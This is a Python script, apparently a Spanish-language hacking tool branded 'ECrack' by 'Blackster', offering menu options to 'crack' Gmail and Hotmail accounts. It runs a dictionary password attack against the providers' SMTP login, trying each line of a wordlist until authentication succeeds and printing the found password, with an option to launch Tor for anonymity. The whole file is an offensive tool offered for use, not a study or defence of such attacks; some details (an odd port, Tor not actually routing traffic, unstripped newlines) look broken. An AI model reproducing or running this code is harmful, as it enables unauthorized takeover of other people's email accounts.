#!/usr/bin/python3

from colorama import Fore, init
import subprocess
import smtplib
import random
import time
import os
init()

os.system('clear')

banner = """
 ██████████   █████████                               █████     
░░███░░░░░█  ███░░░░░███                             ░░███      
 ░███  █ ░  ███     ░░░  ████████   ██████    ██████  ░███ █████
 ░██████   ░███         ░░███░░███ ░░░░░███  ███░░███ ░███░░███ 
 ░███░░█   ░███          ░███ ░░░   ███████ ░███ ░░░  ░██████░  
 ░███ ░   █░░███     ███ ░███      ███░░███ ░███  ███ ░███░░███ 
 ██████████ ░░█████████  █████    ░░████████░░██████  ████ █████
░░░░░░░░░░   ░░░░░░░░░  ░░░░░      ░░░░░░░░  ░░░░░░  ░░░░ ░░░░░ 
                                                                

"""

def inicio():
	os.system('clear')
	print(Fore.MAGENTA,(banner))
	print(Fore.CYAN,"\n\t\t\tBy Blackster")
	menu = """
1->> Crack Gmail.
2->> Crack Hotmail.

00->> Salir.
"""
	print(Fore.GREEN,(menu))

if __name__=="__main__":
	while True:
		inicio()
		ask = int(input("Escoge una opcion: "))
		if ask==1:
			print("Vamos a crackear un Gmail...")
			ask_tor = str(input("Desea activar el servicio tor? (y/n):  "))
			if ask_tor=='y':
				subprocess.run('tor', shell=True)
				time.sleep(1)
				server = smtplib.SMTP("smtp.gmail.com", 587)
				server.ehlo()
				server.starttls()
				time.sleep(1)
				correo = input("Introduce tu correo: ")
				diccionario = input("Introduce la ruta de tu diccionario: ")
				pass_file = open(diccionario, "r")
				for password in pass_file:
					try:
						server.login(correo, password)
						print("[*] Contraseña encontrada %s" % password)
						break;
					except smtplib.SMTPAuthenticationError:
						print("[*] Contraseña no encontrada %s" % password)

			elif ask_tor=='n':
				server = smtplib.SMTP("smtp.gmail.com", 587)
				server.ehlo()
				server.starttls()
				time.sleep(1)
				correo = input("Introduce tu correo: ")
				diccionario = input("Introduce la ruta de tu diccionario: ")
				pass_file = open(diccionario, "r")
				for password in pass_file:
					try:
						server.login(correo, password)
						print("[*] Contraseña encontrada %s" % password)
						break;
					except smtplib.SMTPAuthenticationError:
						print("[*] Contraseña no encontrada %s" % password)

		elif ask==2:
			print("Vamos a crackear un Hotmail...")
			ask_tor = str(input("Desea activar el servicio de tor? (y/n): "))
			if ask_tor=='y':
				subprocess.run('tor', shell=True)
				time.sleep(1)
				server = smtplib.SMTP("smtp.live.com", 578)
				server.ehlo()
				server.starttls()
				time.sleep(1)
				correo = input("Introduce tu correo: ")
				diccionario = input("Introduce la ruta de tu diccionario: ")
				pass_file = open(diccionario, "r")
				for password in pass_file:
					try:
						server.login(correo, password)
						print("[*] Contraseña encontrada %s" % password)
						break;
					except smtplib.SMTPAuthenticationError:
						print("[*] Contraseña no encontrada %s" % password)
				
			elif ask_tor=='n':
				server = smtplib.SMTP("smtp-mail.outlook.com", 587)
				server.starttls()
				time.sleep(1)
				correo = input("Introduce tu correo: ")
				diccionario = input("Introduce la ruta de tu diccionario: ")
				pass_file = open(diccionario, "r")
				for password in pass_file:
					try:
						server.login(correo, password)
						print("[*] Contraseña encontrada %s" % password)
						break;
					except smtplib.SMTPAuthenticationError:
						print("[*] Contraseña no encontrada %s" % password)

		else:
			if ask==00:
				print("See you...")
				break;